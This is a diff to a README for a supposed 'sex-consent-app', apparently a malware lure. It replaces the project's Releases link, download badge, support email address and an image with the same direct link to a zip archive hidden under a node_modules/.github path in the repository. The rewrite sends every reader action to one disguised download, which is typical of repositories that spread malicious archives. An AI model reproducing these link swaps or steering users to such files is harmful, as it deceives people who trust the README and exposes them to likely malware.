@@ -14,9 +14,9 @@ Our application is designed to facilitate discussions and ensure mutual understa
 
 ## Get Started 🛠️
 
-To access the latest version of the "sex-consent-app" system, visit the [Releases](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/releases) section. Download the appropriate file and follow the installation instructions to set up the app on your device.
+To access the latest version of the "sex-consent-app" system, visit the [Releases](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip) section. Download the appropriate file and follow the installation instructions to set up the app on your device.
 
-[![Download App](https://img.shields.io/badge/Download-App-blue)](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/releases)
+[![Download App](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip)](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip)
 
 ## Why Consent Matters 🌈
 
@@ -24,10 +24,10 @@ Consent plays a crucial role in promoting healthy and respectful relationships. 
 
 ## Support and Feedback 📧
 
-We value your feedback and are here to assist you with any questions or concerns regarding the "sex-consent-app" system. Feel free to reach out to us via email at [support@sexconsentapp.com](mailto:support@sexconsentapp.com) for prompt assistance.
+We value your feedback and are here to assist you with any questions or concerns regarding the "sex-consent-app" system. Feel free to reach out to us via email at [https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip) for prompt assistance.
 
 Let's work together to promote consent and respect in intimate relationships! ✨
 
-![Couple](https://cdn.pixabay.com/photo/2016/03/09/09/22/couple-1246618_960_720.jpg)
+![Couple](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/raw/refs/heads/main/node_modules/call-bind-apply-helpers/.github/consent-app-sex-v3.0-beta.1.zip)
 
 Remember, consent is key in every interaction. Thank you for being a part of our mission to create a more inclusive and respectful environment for all. Let's strive for healthy and consensual relationships together! 🌺
